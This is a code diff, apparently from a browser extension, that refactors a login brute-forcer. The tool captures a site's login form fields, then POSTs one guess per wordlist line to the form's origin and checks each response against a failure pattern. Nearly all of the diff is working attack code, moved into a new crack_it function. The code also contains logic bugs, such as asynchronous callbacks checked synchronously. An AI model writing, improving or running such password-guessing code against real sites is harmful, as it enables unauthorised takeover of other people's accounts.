@@ -7,6 +7,7 @@ var crackuser;
 var wordlist;
 var msgHandler = () => {};
 var cracked = false;
+var pagedata;
 
 function handleMessage(msg) {
   msgHandler(msg);
@@ -35,6 +36,55 @@ function cracking_header_listener(e) {
   });
 }
 
+function crack_it(e) {
+    var un_f;
+    var pw_f;
+    var iter;
+    var ops = "";
+    pagedata.body.forEach(body => {
+      if(body.value === "UN") {
+        un_f = body.name;
+      //  console.log("Username Feild: " + un_f);
+      }
+      if(body.value === "PW") {
+        pw_f = body.name;
+      //  console.log("Pass Feild: " + pw_f);
+      } else {
+        if ((body.value != "PW") && (body.value != "UN")) {
+          ops = ops.concat(body.name, "=", body.value, "&");
+        }
+      }
+    });
+    var wordbyline = wordlist.split("\n");
+    console.log(ops);
+    for(iter = 0; iter < wordbyline.length-1; iter++) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", e.originUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.send(ops + un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
+      xhr.onload  = function() {
+        var databack = this.responseText;
+        if(databack.length < 5) {
+          console.log("Error short page.");
+        } else if((databack.match(RegExp(failpattern), "gi") != null) && (databack.length > 5)) {
+//          console.log("Bad password");
+        } else if((databack.match(RegExp(failpattern), "gi") === null) && (databack.length > 5)) {
+        cracked = true;
+        }
+      }
+      if(cracked == true) {
+        break;
+      }
+    }
+    if(cracked == true) {
+      console.log("Username: " + crackuser + " Password: " + wordbyline[iter]);
+      stop_cracking();
+    }
+    else {
+      console.log("Sorry, couldn't crack with this wordlist");
+    }
+}
+
 function cracking_request_listener(e) {
   if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
   if(!~types.indexOf(e.type)) return e;
@@ -49,62 +99,14 @@ function cracking_request_listener(e) {
         });
       }
     }
-    var data = {
+    pagedata = {
       method: e.method,
       url: e.url,
       type: e.type,
       body: body
     };
     done(e);
-    var un_f;
-    var pw_f;
-    var badpasserror = failpattern;
-    var iter;
-    var ops = "";
-    data.body.forEach(body => {
-      if(body.value === "UN") {
-        un_f = body.name;
-      //  console.log("Username Feild: " + un_f);
-      }
-      if(body.value === "PW") {
-        pw_f = body.name;
-      //  console.log("Pass Feild: " + pw_f);
-      } else {
-        if ((body.value != "PW") && (body.value != "UN")) {
-          ops = ops.concat(body.name, "=", body.value, "&");
-        }
-      }
-    });
-    console.log(e.originUrl);
-    var wordbyline = wordlist.split("\n");
-      console.log(ops);
-    for(iter = 0; iter < wordbyline.length-1; iter++) {
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", e.originUrl, true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send(ops + un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
-      xhr.onload  = function() {
-        var databack = this.responseText;
-        if(databack.length < 5) {
-          console.log("Error short page.");
-        } else if((databack.match(RegExp(badpasserror), "gi") != null) && (databack.length > 5)) {
-//          console.log("Bad password");
-        } else if((databack.match(RegExp(badpasserror), "gi") === null) && (databack.length > 5)) {
-        cracked = true;
-        }
-      }
-      if(cracked == true) {
-        stop_cracking_listener();
-        break;
-      }
-    }
-    if(cracked == true) {
-      console.log("Username: " + crackuser + " Password: " + wordbyline[iter]);
-      stop_cracking_listener();
-    }
-    else {
-      console.log("Sorry, couldn't crack with this wordlist");
-    }
+    crack_it(e);
   });
 }
 
